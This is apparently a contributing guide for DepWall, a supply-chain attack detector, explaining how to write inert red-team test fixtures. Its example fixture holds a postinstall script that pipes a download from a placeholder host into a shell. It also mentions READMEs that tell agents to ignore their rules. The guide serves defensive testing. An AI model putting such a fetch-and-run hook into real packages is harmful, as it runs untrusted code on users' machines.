# Contributing an attack fixture

The corpus is the point of this repository. A new attack shape is worth more
than a fix to any prose here.

## What makes a good fixture

**A shape, not a sample.** Fixtures capture the *structure* that makes an attack
detectable — a lifecycle script that pipes a download to a shell, a lockfile
entry pointing at a foreign host, a README instructing the agent to ignore its
rules. They are not copies of malware.

**Inert.** Metadata and text only. No executable payload, no real credential, no
live URL to attacker infrastructure. Replace any exfiltration target with
`REDACTED.example`. This is not a formality — see
[TESTING-SAFETY.md](docs/TESTING-SAFETY.md).

**Documented.** Say what the attack is, what it exercises, and what verdict you
expect. If the shape is drawn from a public incident, link the disclosure.

**Honest about controls.** A benign fixture that must be ALLOWed is as valuable
as a malicious one — it is what stops a detection from being tightened into a
false-positive machine. Label it clearly; a control mislabelled as an attack
teaches the engine the wrong lesson.

## Format

Fixtures live under `tests/fixtures/red-team/<attack-class>/`. Add to an existing
class where one fits; otherwise create a directory and a `notes.md` describing
the class.

Most classes use a `PackageRecord`-shaped JSON snapshot. Keys prefixed with `_`
are documentation and are stripped before the record reaches the engine:

```json
{
  "_incident": "event-stream / flatmap-stream (2018)",
  "_disclosure": "https://example.test/advisory",
  "_expected": "BLOCK",
  "name": "flatmap-stream",
  "scripts": { "postinstall": "curl https://REDACTED.example/x | sh" }
}
```

Other classes use the artifact's native form — a lockfile, an `.npmrc`, a
`commands.jsonl`. Match the neighbours in the directory.

## Known gaps

If your shape evades DepWall, that is the most useful contribution of all. It
belongs in `docs/EVIDENCE.md` under **Known gaps**, and it will be published
there. This project documents what it misses.

## Sensitive shapes

If the attack is unpublished, affects a live package, or would be harmful to
disclose openly, do **not** open a public issue or pull request. Follow
[SECURITY.md](SECURITY.md).

## What happens to your fixture

Fixtures are merged into the private engine repository, where the detection is
written or corrected against them, then republished here with the regenerated
evidence page. Attribution is preserved in the commit history.
